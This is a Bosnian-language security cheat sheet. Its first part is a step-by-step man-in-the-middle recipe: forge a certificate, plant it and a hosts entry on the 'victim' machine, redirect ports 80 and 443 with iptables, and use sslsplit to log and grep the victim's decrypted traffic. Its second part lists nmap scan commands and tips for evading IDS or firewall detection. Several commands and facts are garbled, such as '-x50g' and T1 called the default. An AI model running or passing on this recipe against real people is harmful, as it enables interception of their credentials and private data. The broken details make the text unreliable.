<h1>Informacijska sigurnost cheat sheet</h1>

<h2>Man in the middle attack </h2>

<p>Svrha ovog pristupa jeste da se kreira doslovno nova putanja (flow) izmedju TCP zahtjeva sa racunara zrtve.
Postupak:</p>

Kreiramo folder:

``mkdir ime_foldera``

Udjemo u kreirani folder:

​	``cd ime_foldera``

Kreiramo RSA javni kljuc

​	``openssl genrsa -out ime_kljuca.key 4096 (4096 je velicina u bytes od kljuca)	``

Kreiramo SSL certifikat sa nasim javnim kljucem (prethodno kreiranim)

​	``openssl req -x50g -days 365 -key ime_kljuca.key -out ime_certifikata.crt``

Na neki nacin je potrebno da u web browser racunara nase zrtve importujemo kreirani SSL certifikatPotrebno je da u hosts file racunara zrtve dodamo nasu IP adresu i web domenu 

Putanja za Windows:

​	``C:\windows\system32\drivers\etc\hosts.file``

Forwarding, odnosno preusmjeravanja svih TCP zahtjeva sa porta 80 kao i sa porta 443 na nas racunar
Postavimo ipv4 forwarding na **true** aka 1:

​	``sudo sysctl net.ipv4.ip_forward=1``

Kreiramo net subsistem te isti ocistimo **sa -F** za flush:

​	``sudo iptables -t nat -F``

​	``sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT –toports     8080``

​	``sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT –toports     8443``

***nat je network address transition (prebacuje zahtjeve sa jedne IP adrese na drugu)**

Poslije izvrsavanja donje komande udjemo u debug mode i mozemo sve zahtjeve sa racunara zrtve da preusmjerimo i logujemo u nas log file:

​	``sudo sslsplit -D -l connections.log -j /tmap/ -s logdir/ -k ime_kljuca.key -c ime_certifikata ssl 0.0.0.0 8443 ime_stranice``

Nakon ovoga, potrebno je da udjemo u nas folder sa **cd ime_foldera**Nakon toga sa **cat** komandom procitamo nas log fajlTe nakon toga sa **grep** komandom pretrazujemo sta nas zanima, npr. ime nekog html input polja ili slicno



<h2>NMAP komanda</h2>

<p>Network mapper komanda nam koristi kako bi smo spoznali vise informacija o IP adresi, verzijama OS na njima, otvorenim portovima i njihovim stanjima kao i razne druge informacije. **Po default-u, skenira se prvih 1000 portova, izlaze se njihovo stanje koje moze biti open,closed,filtered,** te kombinacija nekih od ova tri. Prvo se provjerava da li je host (meta koju skeniramo) uopste aktivna (up). Ukoliko nije, nista od daljnjeg skeniranja nije izvrseno. Takodjer, nad skeniranim portovima mozemo vidjeti koji do protokola se izvrsava na njima. Pored jedne domene ili IP adrese, mozemo skenirati i neki range IP adresa</p>



``nmap ime_domene`` - Ova komanda izvrsi skeniranje u **default** mode.

``sudo nmap -sV ime_domene`` - Ova komanda nam pored default ponasanja ponudi i verziju na kojoj se nalazi port.

``nmap -A ime_domene`` - Ova komanda nam pored default ponasanja nudi i  nekih vise informacija poput kljuceva na portovima i slicno.

``nmap -sP ime_domene`` - Ova komanda nam nudi portove ali samo one na kojima je **host up**.

``nmap -PS ime_domene`` - Ova komanda nam dodatno nudi manipulaciju stanja 3-way  handshake-a. Konkretno ovdje ga **izvrsimo bez ACK polja**.

``curl -vvv ime_domene`` - Ova komanda nam **salje 1 GET** zahtjev te da povratne informacije.

``nmap --system-dns ime_domene`` - Ova komanda nam govori koji DNS sistem da koristimo.

``nmap -n ime_domene`` - Preskocimo DNS 

``nmap -Pn ime_domene`` - Ova komanda **podrazumijeva** **da je host up**, stoga odmah prelazi na skeniranje portova.

``nmap -sT ime_domene`` - Izvrsava kompletan 3-way handshake.

``nmap -p broj_porta ime_domene`` - Skenira samo odredjeni port.

``nmap -F ime_domene`` - Skenira samo prvih 100 najpopularnijih portova.

``nmap --top-ports broj_portova ime_domene`` - Omoguci skeniranje odredjenog broja najpopularnijih portova.

``sudo nmap -sU ime_domene`` - Skenira po UDP protokolu za razliku od default skeniranja po TCP protokolu.

``sudo nmap -O ime_domene`` - Dodatno nam kaze OS na serveru.



Takodjer mozemo **koristiti flagove -T5,4,3,2,1 gdje je T1 default nacin skeniranja**, najsporiji je te jako je mala sansa da cemo biti otkriveni od IDP, IDS ili firewall-a. **Sto je broj veci, skeniranje je radjeno agresivnije te je samim time veca mogucnost da budemo otkriveni sa strane mete.**



Znacenja razlicitih stanja portova:

1. Open - Aktivan servis koji odgovara na zahtjeve 
2. Closed - Ne koristeni portovi
3. Filtered- Aktivan servis koji slusa i odgovara medjutim ima neku vrstu IDP-a (intrusion detection protection) ili firewall-a na sebi





